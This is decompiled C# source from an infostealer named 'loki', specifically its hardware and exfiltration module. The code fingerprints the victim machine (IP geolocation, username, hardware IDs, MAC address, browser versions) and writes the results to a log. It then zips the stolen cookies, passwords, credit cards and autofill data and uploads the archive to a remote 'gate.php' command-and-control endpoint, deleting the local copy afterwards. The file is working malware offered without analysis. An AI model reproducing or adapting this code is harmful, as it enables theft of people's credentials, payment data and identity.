using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;
using loki.loki.Stealer.Cookies;
using loki.loki.Stealer.Credit_Cards;
using loki.loki.Stealer.Passwords;
using loki.loki.Stealer.WebData;
using Microsoft.Win32;
using NoFile;
using Reborn;

namespace loki.loki.Utilies.Hardware
{
	// Token: 0x0200002A RID: 42
	public static class Hardware
	{
		// Token: 0x0600016B RID: 363 RVA: 0x00008FF4 File Offset: 0x000071F4
		public static string Define_windows()
		{
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem"))
				{
					string text = string.Empty;
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = managementBaseObject["Caption"].ToString();
					}
					result = (text.Contains("8") ? "Windows 8" : (text.Contains("8.1") ? "Windows 8.1" : (text.Contains("10") ? "Windows 10" : (text.Contains("XP") ? "Windows XP" : (text.Contains("7") ? "Windows 7" : (text.Contains("Server") ? "Windows Server" : "Unknown"))))));
				}
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00009108 File Offset: 0x00007308
		public static string Get_guid()
		{
			string result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
					{
						if (registryKey2 != null)
						{
							object value = registryKey2.GetValue("MachineGuid");
							if (value != null)
							{
								result = value.ToString().ToUpper().Replace("-", string.Empty);
							}
							throw new IndexOutOfRangeException("Index Not Found: MachineGuid");
						}
						throw new KeyNotFoundException("Key Not Found: SOFTWARE\\Microsoft\\Cryptography");
					}
				}
			}
			catch
			{
				result = "HWID not found";
			}
			return result;
		}

		// Token: 0x0600016D RID: 365 RVA: 0x000091BC File Offset: 0x000073BC
		public static void Info(string dir)
		{
			object obj = 0;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
			{
				obj = managementBaseObject["NumberOfLogicalProcessors"];
			}
			string id = Identification.GetId();
			string str = Hardware.Define_windows();
			string value;
			using (WebResponse response = WebRequest.Create("http://ip-api.com/line/?fields").GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
				{
					value = streamReader.ReadToEnd();
				}
			}
			using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "\\R725K54.tmp"))
			{
				streamWriter.WriteLine(value);
			}
			string[] array = File.ReadAllLines(Path.GetTempPath() + "\\R725K54.tmp", Encoding.Default);
			byte[] array2 = Convert.FromBase64String("aguidthatIgotonthewire==");
			Array.Reverse(array2, 0, 4);
			Array.Reverse(array2, 4, 2);
			Array.Reverse(array2, 6, 2);
			Guid guid = new Guid(array2);
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
			{
				object obj2 = 0;
				using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_NetworkAdapterConfiguration"))
				{
					object obj3 = 0;
					foreach (ManagementBaseObject managementBaseObject2 in managementObjectSearcher2.Get())
					{
						obj3 = ((ManagementObject)managementBaseObject2)["MACAddress"];
					}
					foreach (ManagementBaseObject managementBaseObject3 in managementObjectSearcher.Get())
					{
						obj2 = ((ManagementObject)managementBaseObject3)["Name"];
					}
					object obj4 = 0;
					using (ManagementObjectSearcher managementObjectSearcher3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
					{
						foreach (ManagementBaseObject managementBaseObject4 in managementObjectSearcher3.Get())
						{
							obj4 = ((ManagementObject)managementBaseObject4)["Caption"];
						}
					}
					using (ManagementObjectSearcher managementObjectSearcher4 = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory"))
					{
						int num = 1;
						foreach (ManagementBaseObject managementBaseObject5 in managementObjectSearcher4.Get())
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject5;
							num++;
						}
						int num2 = 0;
						using (StreamWriter streamWriter2 = new StreamWriter(dir + "\\information.log"))
						{
							streamWriter2.WriteLine(string.Concat(new string[]
							{
								Settings.name,
								" ",
								Settings.Stealer_version,
								" ",
								Settings.coded
							}));
							streamWriter2.WriteLine(" ");
							streamWriter2.WriteLine("IP : " + array[13]);
							streamWriter2.WriteLine("Country Code : " + array[2]);
							streamWriter2.WriteLine("Country :" + array[1]);
							streamWriter2.WriteLine("State Name : " + array[4]);
							streamWriter2.WriteLine("City :" + array[5]);
							streamWriter2.WriteLine("Timezone :" + array[9]);
							streamWriter2.WriteLine("ZIP : " + array[6]);
							streamWriter2.WriteLine("ISP : " + array[10]);
							streamWriter2.WriteLine("Coordinates :" + array[7] + " , " + array[8]);
							streamWriter2.WriteLine(" ");
							streamWriter2.WriteLine("Username : " + Environment.UserName);
							streamWriter2.WriteLine("PCName : " + Environment.MachineName);
							TextWriter textWriter = streamWriter2;
							string str2 = "UUID : ";
							Guid guid2 = guid;
							textWriter.WriteLine(str2 + guid2.ToString());
							streamWriter2.WriteLine("HWID : " + id);
							streamWriter2.WriteLine("OS : " + str);
							streamWriter2.WriteLine("CPU : " + ((obj2 != null) ? obj2.ToString() : null));
							streamWriter2.WriteLine("CPU Threads: " + ((obj != null) ? obj.ToString() : null));
							streamWriter2.WriteLine("GPU : " + ((obj4 != null) ? obj4.ToString() : null));
							streamWriter2.WriteLine("RAM :" + num.ToString() + " GB");
							streamWriter2.WriteLine("MAC :" + ((obj3 != null) ? obj3.ToString() : null));
							streamWriter2.WriteLine("Screen Resolution :" + Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + Screen.PrimaryScreen.Bounds.Height.ToString());
							streamWriter2.WriteLine("System Language : " + CultureInfo.CurrentUICulture.DisplayName);
							streamWriter2.WriteLine("Layout Language : " + InputLanguage.CurrentInputLanguage.LayoutName);
							streamWriter2.WriteLine("PC Time : " + DateTime.Now.ToString());
							streamWriter2.WriteLine("Browser Versions");
							if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
							{
								object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
								if (value2 != null)
								{
									num2++;
									streamWriter2.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
								}
								else
								{
									num2++;
									value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
									streamWriter2.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
								}
							}
							if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
							{
								object value3 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
								if (value3 != null)
								{
									num2++;
									streamWriter2.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion);
								}
								else
								{
									num2++;
									value3 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
									streamWriter2.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion);
								}
							}
							if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
							{
								string text = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
								string fileVersion = FileVersionInfo.GetVersionInfo(text.Remove(text.Length - 6, 6).Remove(0, 1)).FileVersion;
								string str3 = string.Empty;
								string empty = string.Empty;
								if (fileVersion.Split(new char[]
								{
									'.'
								}).First<string>().Equals("54"))
								{
									str3 = "67.0.3396.87";
								}
								if (fileVersion.Split(new char[]
								{
									'.'
								}).First<string>().Equals("55"))
								{
									str3 = "68.0.3440.106";
								}
								if (fileVersion.Split(new char[]
								{
									'.'
								}).First<string>().Equals("56"))
								{
									str3 = "69.0.3497.100";
								}
								if (fileVersion.Split(new char[]
								{
									'.'
								}).First<string>().Equals("57"))
								{
									str3 = "70.0.3538.102";
								}
								num2++;
								streamWriter2.WriteLine("Opera Version: " + str3);
							}
							if (num2 == 0)
							{
								streamWriter2.WriteLine("Popular Browsers Not Found!");
							}
							streamWriter2.Close();
						}
					}
				}
			}
			ZipFile.CreateFromDirectory(dir, string.Concat(new string[]
			{
				Path.GetTempPath(),
				"\\",
				array[1],
				"_",
				array[13],
				"_",
				id,
				".zip"
			}));
			try
			{
				new WebClient().UploadFile(Settings.Url + string.Format("gate.php?id={0}&wlt={1}&cki={2}&pwd={3}&cc={4}&frm={5}&hwid={6}", new object[]
				{
					1,
					Crypto.count,
					GetCookies.CCookies,
					GetPasswords.Cpassword,
					Get_Credit_Cards.CCCouunt,
					Get_Browser_Autofill.AutofillCount,
					id
				}), "POST", string.Concat(new string[]
				{
					Path.GetTempPath(),
					"\\",
					array[1],
					"_",
					array[13],
					"_",
					id,
					".zip"
				}));
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			File.Delete(string.Concat(new string[]
			{
				Path.GetTempPath(),
				"\\",
				array[1],
				"_",
				array[13],
				"_",
				id,
				".zip"
			}));
		}
	}
}
